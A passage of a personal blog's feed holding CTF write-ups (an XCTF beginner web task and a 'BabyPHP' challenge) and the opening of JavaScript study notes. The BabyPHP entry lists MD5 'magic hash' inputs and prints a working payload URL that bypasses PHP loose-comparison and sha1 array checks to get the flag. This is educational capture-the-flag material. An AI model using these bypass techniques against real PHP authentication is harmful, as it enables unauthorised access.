href="#font-color-navy3problem-solving-stepfont"></a> <font color="navy">3.Problem solving  step</font></h4><blockquote><p>Press f12 button and we can view the flag on the Elements page.</p><p><img src="/images/79-3.png" alt></p></blockquote><h3 id="font-color-brwon二-post_getfont"><a class="markdownIt-Anchor" href="#font-color-brwon二-post_getfont"></a> <font color="brwon">二、post_get</font></h3><h4 id="font-color-navy1question-requirementfont"><a class="markdownIt-Anchor" href="#font-color-navy1question-requirementfont"></a> <font color="navy">1.Question Requirement</font></h4><p><img src="/images/79-4.png" alt></p><h4 id="font-color-navy2basic-knowledgefont-2"><a class="markdownIt-Anchor" href="#font-color-navy2basic-knowledgefont-2"></a> <font color="navy">2.Basic knowledge</font></h4><blockquote><p>◉ First,there are some difference between post and get.</p><p>    Because someone has done a good summary of the two requests,I can’t summarize them here.<a href="https://www.zhihu.com/question/28586791" target="_blank" rel="noopener">Click here to learn more.</a></p></blockquote><h4 id="font-color-navy3problem-solving-stepfont-2"><a class="markdownIt-Anchor" href="#font-color-navy3problem-solving-stepfont-2"></a> <font color="navy">3.Problem Solving step</font></h4><blockquote><p>◉ The first step:</p><p>    Open the URL in the question and find that we are required to submit a variable named “a” with a value of 1 by GET method.</p><p><img src="/images/79-5.png" alt></p><p>◉ The second step:</p><p>    I constructed “?a=1” in the GET request line by <a href="http://BurpSuit.As" target="_blank" rel="noopener">BurpSuit.As</a> shown following the picture:</p><p><img src="/images/79-6.png" alt></p><p>◉ The third step:</p><p>    In the previous step,we will send the constructed command to the server and we will get the following page:</p><p><img src="/images/79-7.png" alt></p><p>◉ The fourth step:</p><p>    The step requires us to submit a variable named “b” with a value of 2 by POST method.Here,we need to use a tool named “HackBar”.We can do the work by it.</p><p><img src="/images/79-8.png" alt></p><p>◉ The last step:</p><p>    In the step,we can get the flag about the problm.</p><p><img src="/images/79-9.png" alt></p></blockquote><p>​</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;Today I mainly write some notes about the web topic of the XCTF newcomer stage.The following is a list of topics.&lt;/p&gt;
&lt;ol&gt;
&lt;
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="XCTF" scheme="https://muzibing.github.io/tags/XCTF/"/>
    
  </entry>
  
  <entry>
    <title>BabyPHP 解题总结</title>
    <link href="https://muzibing.github.io/2019/08/01/2019.08.01%EF%BC%8878%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/08/01/2019.08.01（78）/</id>
    <published>2019-07-31T16:00:00.000Z</published>
    <updated>2019-09-07T10:30:53.673Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-php-部分漏洞font"><a class="markdownIt-Anchor" href="#font-color-brown一-php-部分漏洞font"></a> <font color="brown">一、PHP 部分漏洞</font></h3><h4 id="font-color-navy1_get-和-_postfont"><a class="markdownIt-Anchor" href="#font-color-navy1_get-和-_postfont"></a> <font color="navy">1.$_GET 和 $_POST</font></h4><blockquote><p>如果 GET 参数中设置 <code>name[]=a</code>，那么 <code>$_GET['name'] = [a]</code>，php 会把 <code>[]=a</code> 当成数组传入， <code>$_GET</code> 会自动对参数调用 <code>urldecode</code>。</p><p><code>$_POST</code> 同样存在此漏洞，提交的表单数据，<code>user[]=admin</code>，<code>$_POST['user']</code> 得到的是 <code>['admin']</code> 是一个数组。</p></blockquote><h4 id="font-color-navy2sha1-和-md5-函数font"><a class="markdownIt-Anchor" href="#font-color-navy2sha1-和-md5-函数font"></a> <font color="navy">2.sha1 和 md5 函数</font></h4><blockquote><p>PHP在处理哈希字符串时，<strong>会利用 ”!=” 或 ”==” 来对哈希值进行比较</strong>，它把每一个以 “0E” 开头的哈希值都解释为 <strong>0</strong>，所以<font color="red">如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 <strong>0</strong></font>。</p><p>MD5不能处理数组，若有以下判断则可用数组<strong>绕过</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="keyword">if</span>(@md5($_GET[<span class="string">'a'</span>]) == @md5($_GET[<span class="string">'b'</span>]))</span><br><span class="line">&gt; &#123;</span><br><span class="line">&gt;     <span class="keyword">echo</span> <span class="string">"yes"</span>;</span><br><span class="line">&gt; &#125;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h4 id="font-color-navy3-符号font"><a class="markdownIt-Anchor" href="#font-color-navy3-符号font"></a> <font color="navy">3.&quot; === &quot; 符号</font></h4><blockquote><p>在数学计算中我们习惯的用 “a = b”，表示的意思是 a 的值与 b 的值相等，而在计算机世界中这样的说法是完全错误的，在计算机的计算中</p><ul><li>“ <strong>a = b</strong> ”：表示的意思是将 b 的值赋值给 a；</li><li>“ <strong>a == b</strong> ”：表示的意思是判断 a 的值与 b 的值是否相等；</li><li>“ <strong>a === b</strong> ”：表示的意思是 a 的<strong>类型</strong>以及<strong>相应的值</strong>与 b 的<strong>类型</strong>以及<strong>相应的值</strong>是否相等，如果返回 1，则表示，a 与 b 是同类型同值关系；</li></ul></blockquote><h3 id="font-color-brown二-分析题目font"><a class="markdownIt-Anchor" href="#font-color-brown二-分析题目font"></a> <font color="brown">二、分析题目</font></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt; </span><br><span class="line">&lt;html&gt; </span><br><span class="line">&lt;head&gt; </span><br><span class="line">    &lt;title&gt;Exercise&lt;/title&gt; </span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt; </span><br><span class="line">&lt;/head&gt; </span><br><span class="line">&lt;body&gt; </span><br><span class="line">&lt;h1&gt;PHP&apos;s basic feature&lt;/h1&gt;&lt;!--好吧其实是老套路了--&gt; </span><br><span class="line">&lt;?php </span><br><span class="line">require_once(&apos;flag.php&apos;); </span><br><span class="line"></span><br><span class="line">if (isset($_GET[&apos;name&apos;]) and isset($_GET[&apos;password&apos;]) &amp;&amp; isset($_GET[&apos;test&apos;]))&#123; </span><br><span class="line">    // ========== Stage 1 ==========  </span><br><span class="line">    $test=$_GET[&apos;test&apos;];  </span><br><span class="line">    $test=md5($test);  </span><br><span class="line"></span><br><span class="line">    if($test==&apos;0&apos;) &#123;  </span><br><span class="line">        print &apos;You passed stage 1.&lt;br /&gt;&apos;; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        print &quot;Game over at stage 1.&quot;;  </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    // ========== Stage 2 ==========  </span><br><span class="line">    if ($_GET[&apos;name&apos;] == $_GET[&apos;password&apos;])&#123; </span><br><span class="line">        print &apos;Your password can not be your name.&apos;; </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line">    else if (sha1($_GET[&apos;name&apos;]) === sha1($_GET[&apos;password&apos;]))&#123; </span><br><span class="line">        print &apos;You passed stage 2.&lt;br /&gt;&apos;; </span><br><span class="line">        print &apos;Flag: &apos;.$flag; </span><br><span class="line">    &#125; </span><br><span class="line">    else&#123; </span><br><span class="line">        print &apos;Invalid password&apos;; </span><br><span class="line">        exit(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line">echo &apos;&lt;hr /&gt;&apos;; </span><br><span class="line">show_source(__FILE__); </span><br><span class="line">?&gt; </span><br><span class="line">&lt;/body&gt; </span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h4 id="font-color-navy1stage-1-分析font"><a class="markdownIt-Anchor" href="#font-color-navy1stage-1-分析font"></a> <font color="navy">1.stage 1 分析</font></h4><blockquote><p>如上面的代码所示，需要输入三个参数：name、password 和 test，对 stage 1 代码分析：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$test=$_GET[<span class="string">'test'</span>];  </span><br><span class="line">$test=md5($test);  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($test == <span class="string">'0'</span>) &#123;  </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'You passed stage 1.&lt;br /&gt;'</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">"Game over at stage 1."</span>;  </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>对输入的 test 值进行 md5 加密，使得加密后的结果等于 0 ，这样就可以通过 stage 1，那么我们在解题时需要做的就是如何使得 test 加密后的结果等于 0 呢？</p></blockquote><h4 id="font-color-navy2stage-2-分析font"><a class="markdownIt-Anchor" href="#font-color-navy2stage-2-分析font"></a> <font color="navy">2.stage 2 分析</font></h4><blockquote><p>在分析了 stage 1 后，我们再继续对 stage 2 的代码进行分析：</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($_GET[<span class="string">'name'</span>] == $_GET[<span class="string">'password'</span>])&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Your password can not be your name.'</span>; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (sha1($_GET[<span class="string">'name'</span>]) === sha1($_GET[<span class="string">'password'</span>]))&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'You passed stage 2.&lt;br /&gt;'</span>; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Flag: '</span>.$flag; </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">else</span>&#123; </span><br><span class="line">    <span class="keyword">print</span> <span class="string">'Invalid password'</span>; </span><br><span class="line">    <span class="keyword">exit</span>(); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>首先要使得输入的 name 和 password 的值不相等，然后将输入的 name 和 password 对应的值分别进行 sha1 进行加密 ，使得加密后的结果是“<strong>同类型同值</strong>”的。在分析了 stage 2 后，我们后面需要做的工作有两个：</p><ul><li>分别找到一个 name 和 password 的值，这两个值不能相等，并对这两个进行 md5 加密，使得结果是同类型同值的 ；</li></ul><p>如果上述的方法不能实现，那么我们再根据 PHP 的漏洞进行攻击。</p></blockquote><h3 id="font-color-brown三-解题步骤font"><a class="markdownIt-Anchor" href="#font-color-brown三-解题步骤font"></a> <font color="brown">三、解题步骤</font></h3><h4 id="font-color-navy1找出-test-的值font"><a class="markdownIt-Anchor" href="#font-color-navy1找出-test-的值font"></a> <font color="navy">1.找出 test 的值</font></h4><blockquote><p>在 BabyXSS 题目中，我们曾经写过一个是关于求通过输入数据，数据经过 md5 加密并匹配给定的字符串的脚本，那么我们将那个程序直接拿过来用，把给定的字符串替换为 0 ，我们尝试求一下解，果然我们得到了一个数值：27，但是将 test = 27 放到 URL 中，结果是错误的。</p><br><p>那么我们再换个思维去思考这个问题，在 PHP 漏洞的总结中可以知道，<code>PHP在处理哈希字符串时，会利用 ”!=” 或 ”==” 来对哈希值进行比较，它把每一个以 “0E” 开头的哈希值都解释为 0，所以如果两个不同的密码经过哈希以后，其哈希值都是以 “0E” 开头的，那么PHP将会认为它们都是 0。</code>那么我们只需要找到加密后的结果是以 <strong>0E</strong> 开头的原文就可以了，那么经过尝试我们得出以下几个原文和密文：</p><ul><li>QNKCDZO ——&gt; 0e830400451993494058024219903391</li><li>PJNPDWY ——&gt; 0e291529052894702774557631701704</li><li>NWWKITQ ——&gt; 0e763082070976038347657360817689</li><li>NOOPCJF ——&gt; 0e818888003657176127862245791911</li><li>MMHUWUV ——&gt; 0e701732711630150438129209816536</li><li>MAUXXQC ——&gt; 0e478478466848439040434801845361</li><li>IHKFRNS ——&gt; 0e256160682445802696926137988570</li><li>GZECLQZ ——&gt; 0e537612333747236407713628225676</li></ul><p>我们只需要选择其中的一个就可以，在这里我们选择 “<strong>QNKCDZO</strong>” 进行尝试得到下图的结果：</p><p><img src="/images/1564657630.jpg" alt></p></blockquote><h4 id="font-color-navy2求-name-和-passwordfont"><a class="markdownIt-Anchor" href="#font-color-navy2求-name-和-passwordfont"></a> <font color="navy">2.求 name 和 password</font></h4><blockquote><p>下面我们要求 name 和 password 的值了，在这里需要提的一个就是 sha1 碰撞，通过这种碰撞是可以找出两个数的 sha1 值相等的，但是花的时间和精力就相对大些，那我们是不是也可以通过 PHP 的漏洞，绕过 sha1 使得满足 if 条件呢？</p><br><p>答案是肯定的，在 PHP 漏洞总结中，我们有一个是关于 sha1 的，<code>sha1([]) 和 md5([]) 处理数组不会报错，直接返回false</code>，那么我们可以通过使 name 和 password 为数组类型，sha1 对数组处理后返回 null 绕过 “===” 。</p><p><br>现在我们使 <font color="red"><strong>name[]=0&amp;password[]=2</strong></font>，这个时候能够成功的满足<code>if ($_GET['name'] == $_GET['password'])</code>不相等，在<code>else if (sha1($_GET['name']) === sha1($_GET['password']))</code>的条件中，sha1 对 name 和 password 的数组类型无法理解都返回 <code>null</code>，也就使得 null === null ，所以也就满足第二个条件。</p></blockquote><h4 id="font-color-navy3提交构造的-payload获取-flagfont"><a class="markdownIt-Anchor" href="#font-color-navy3提交构造的-payload获取-flagfont"></a> <font color="navy">3.提交构造的 payload，获取 flag</font></h4><blockquote><p>经过以上两步的分析，我们可以得到三个参数的值，那么下面我们构造一下 payload ：</p><center><font color="red">http://123.207.149.64:23331/feature/?test=QNKCDZO&password[]=2&name[]=0</font></center>我们可以从服务器得到 flag：<p><img src="/images/1564661617(1).png" alt></p></blockquote><p><img src="https://www.canva.cn/learn/wp-content/uploads/sites/17/2019/07/%E5%BB%BA%E5%86%9B%E8%8A%82%E7%BA%AA%E5%BF%B5%E6%97%A5%E2%94%82%E4%B8%BA%E5%86%9B%E5%93%A5%E5%93%A5%E6%89%93call%E7%9A%84%E7%AC%AC92%E5%B9%B422.jpg" alt></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;font-color-brown一-php-部分漏洞font&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#font-color-brown一-php-部分漏洞font&quot;&gt;&lt;/a&gt; &lt;font color=&quot;brown&quot;&gt;一、PHP 部
      
    
    </summary>
    
    
      <category term="解题总结" scheme="https://muzibing.github.io/tags/%E8%A7%A3%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    
      <category term="web" scheme="https://muzibing.github.io/tags/web/"/>
    
      <category term="PHP" scheme="https://muzibing.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>JavaScript 学习笔记（一）</title>
    <link href="https://muzibing.github.io/2019/07/31/2019.07.31%EF%BC%8877%EF%BC%89/"/>
    <id>https://muzibing.github.io/2019/07/31/2019.07.31（77）/</id>
    <published>2019-07-30T16:00:00.000Z</published>
    <updated>2019-07-31T11:47:41.983Z</updated>
    
    <content type="html"><![CDATA[<h3 id="font-color-brown一-js-简介font"><a class="markdownIt-Anchor" href="#font-color-brown一-js-简介font"></a> <font color="brown">一、JS 简介</font></h3><blockquote><p>getElementById() 是多个 JavaScript HTML 方法之一</p><ol><li><p><strong>JavaScript 能够改变 HTML 的内容</strong>：</p><p><font color="navy">document.getElementById(“demo”).innerHTML = “Hello JavaScript”;</font></p></li><li><p><strong>JavaScript 能够改变 HTML 属性</strong>：</p><p><font color="navy">document.getElementById(“demo”).src =</font></p></li><li><p><strong>JavaScript 能够改变 HTML 样式 (CSS)</strong>:</p><p><font color="navy">document.getElementById(“demo”).style.fontSize=&quot;&quot;</font></p></li><li><p><strong>JavaScript 能够隐藏 HTML元素</strong>:</p><p><font color="navy">document.getElementById(“demo”).style.display=‘none’</font></p></li><li><p><strong>JavaScript 能够显示 HTML 元素</strong>:</p><p><font color="navy">document.getElementById(“demo”).style.display=“block”</font></p></li></ol></blockquote><h3 id="font-color-brown二-js-使用font"><a class="markdownIt-Anchor" href="#font-color-brown二-js-使用font"></a> <font color="brown">二、JS 使用</font></h3><blockquote><h4 id="font-color-navy1-script标签font"><a class="markdownIt-Anchor" href="#font-color-navy1-script标签font"></a> <font color="navy">1. &lt;script&gt;标签</font></h4><p>      在 HTML 中，JavaScript 代码必须位于 &lt;script&gt; 与 &lt;/script&gt; 标签之间.</p><h4 id="font-color-navy2javascript-函数和事件font"><a class="markdownIt-Anchor" href="#font-color-navy2javascript-函数和事件font"></a> <font color="navy">2.JavaScript 函数和事件</font></h4><p>      JavaScript 函数是一种 JavaScript 代码块，它可以在调用时被执行。例如，当发生事件时调用函数，比如当用户点击按钮时。</p><h4 id="font-color-navy3-head-或-body-中的-javascriptfont"><a class="markdownIt-Anchor" href="#font-color-navy3-head-或-body-中的-javascriptfont"></a> <font color="navy">3. &lt;head&gt; 或 &lt;body&gt; 中的 JavaScript</font></h4><ul><li><p>&lt;head&gt;中的 JavaScript</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;       <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>一张网页<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li><p>&lt;body&gt; 中的 JavaScript</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Web Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span> </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h1</span>&gt;</span>A Web Page<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="actionscript">&gt;   <span class="function"><span class="keyword">function</span> <span class="title">myFunction</span><span class="params">()</span> </span>&#123;</span></span><br><span class="line"><span class="javascript">&gt;      <span class="built_in">document</span>.getElementById(<span class="string">"demo"</span>).innerHTML = <span class="string">"段落被更改。"</span>;</span></span><br><span class="line"><span class="undefined">&gt;   &#125;</span></span><br><span class="line"><span class="undefined">&gt;   </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><p><strong>注意</strong>：把脚本置于 <strong>&lt;body&gt;</strong> 元素的底部，可改善显示速度，因为脚本编译会拖慢显示</p><h4 id="font-color-navy4外部脚本font"><a class="markdownIt-Anchor" href="#font-color-navy4外部脚本font"></a> <font color="navy">4.外部脚本</font></h4><ul><li><p>外部文件：myScript.js</p><p>外部脚本很实用，如果相同的脚本被用于许多不同的网页。JavaScript 文件的文件扩展名是 <strong>.js</strong>。如需使用外部脚本，请在&lt;scripT&gt; 标签的 src (source) 属性中设置脚本的名称</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"myScript.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   <span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">h2</span>&gt;</span>外部 JavaScript<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span> <span class="attr">id</span>=<span class="string">"demo"</span>&gt;</span>一个段落。<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">"button"</span> <span class="attr">onclick</span>=<span class="string">"myFunction()"</span>&gt;</span>试一试<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">p</span>&gt;</span>（myFunction 存储在名为 "myScript.js" 的外部文件中。）<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/demo/myScript.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">&gt;   </span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line">&gt;   <span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li><p>外部引用的方式</p><ul><li>可通过完整的 URL 或相对于当前网页的路径引用外部脚本：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"https://www.w3school.com.cn/js/myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></li></ul></blockquote><blockquote><ul><li>使用了位于当前网站上指定文件夹中的脚本：</li></ul>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"/js/myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><blockquote><ul><li>链接了与当前页面相同文件夹的脚本：</li></ul>  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;   <span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"myScript1.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure></blockquote><h3 id="font-color-brown三-js-输出font"><a class="markdownIt-Anchor" href="#font-color-brown三-js-输出font"></a> <font color="brown">三、JS 输出</font></h3><blockquote><h4 id="font-color-navy1-js-显示方案font"><a class="markdownIt-Anchor" href="#font-color-navy1-js-显示方案font"></a> <font color="navy">1. JS 显示方案</font></h4><p>     JavaScript 